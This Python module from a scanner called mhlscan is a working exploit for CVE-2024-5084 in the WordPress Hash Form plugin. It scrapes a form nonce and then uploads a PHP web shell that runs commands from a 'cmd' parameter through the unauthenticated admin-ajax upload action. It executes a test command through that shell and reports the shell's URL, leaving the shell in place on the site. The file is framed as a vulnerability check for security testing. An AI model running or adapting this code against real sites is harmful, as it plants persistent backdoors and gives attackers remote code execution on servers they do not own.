# GNU GPL License V3
# mhlscan by sigit-hdteamlabs

# -*- coding: utf-8 -*-
"""CVE-2024-5084 - WordPress Hash Form Unauthenticated File Upload → RCE."""

import re
import requests
import urllib3

from ._base import cve_module

urllib3.disable_warnings()


@cve_module(
    cve_id="CVE-2024-5084",
    name="WordPress Hash Form Unauthenticated File Upload",
    severity="critical",
    requires=["wordpress", "hash-form-plugin"],
    timeout=20,
    description="Nonce leak → upload PHP → RCE",
    aggressive=False,
)
def test(url, timeout=20, oast_url=None, **kwargs):
    base = url.rstrip("/")

    try:
        r = requests.head(f"{base}/wp-content/plugins/hash-form/",
                          timeout=timeout, verify=False, allow_redirects=False)
        if r.status_code not in (200, 301, 403):
            return {"status": "not_vulnerable",
                    "details": "Plugin hash-form tidak terdeteksi"}
    except Exception:
        return {"status": "not_vulnerable", "details": "connection failed"}

    nonce = None
    for page in ["/", "/contact", "/contact-us", "/form", "/submit"]:
        try:
            r = requests.get(base + page, timeout=timeout, verify=False)
            if "hashform" not in r.text.lower():
                continue
            for pattern in [
                r'"nonce"\s*:\s*"(\w+)"',
                r'"hashform_nonce"\s*:\s*"(\w+)"',
                r'name="hashform_nonce"\s+value="(\w+)"',
            ]:
                m = re.search(pattern, r.text)
                if m:
                    nonce = m.group(1)
                    break
            if nonce:
                break
        except Exception:
            continue

    if not nonce:
        return {"status": "unknown",
                "details": "Nonce tidak ditemukan di halaman form"}

    shell = '<?php system($_GET["cmd"]); ?>'
    shell_name = "mhlscan_probe.php"
    upload_url = f"{base}/wp-admin/admin-ajax.php"
    params = {
        "action": "hashform_file_upload_action",
        "allowedExtensions[0]": "php",
        "sizeLimit": 1048576,
        "qqfile": shell_name,
        "file_uploader_nonce": nonce,
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/octet-stream",
    }

    try:
        r = requests.post(upload_url, params=params, data=shell,
                          headers=headers, timeout=timeout, verify=False)
        if r.status_code != 200:
            return {"status": "not_vulnerable",
                    "details": f"Upload HTTP {r.status_code}"}

        try:
            resp = r.json()
        except ValueError:
            return {"status": "unknown", "details": "Non-JSON response"}

        shell_url = resp.get("url")
        if not shell_url:
            return {"status": "not_vulnerable", "details": "No shell URL returned"}

        try:
            check = requests.get(f"{shell_url}?cmd=echo+MHLSCAN_PROBE_OK",
                                 timeout=timeout, verify=False)
            if "MHLSCAN_PROBE_OK" in check.text:
                return {
                    "status": "vulnerable",
                    "details": "PHP shell uploaded + RCE verified",
                    "evidence": f"Shell uploaded to {shell_url}",
                    "endpoint": "/wp-admin/admin-ajax.php",
                    "payload_file": shell_url,
                    "uploaded_shell": shell_url,
                    "shell_param": "cmd",
                }
            return {
                "status": "potential",
                "details": "Upload sukses tapi RCE tidak verified",
                "evidence": f"Shell: {shell_url}",
                "uploaded_shell": shell_url,
            }
        except Exception:
            return {
                "status": "potential",
                "details": "Shell uploaded but not verified",
                "uploaded_shell": shell_url,
            }
    except Exception as e:
        return {"status": "error", "details": type(e).__name__ + ": " + str(e)}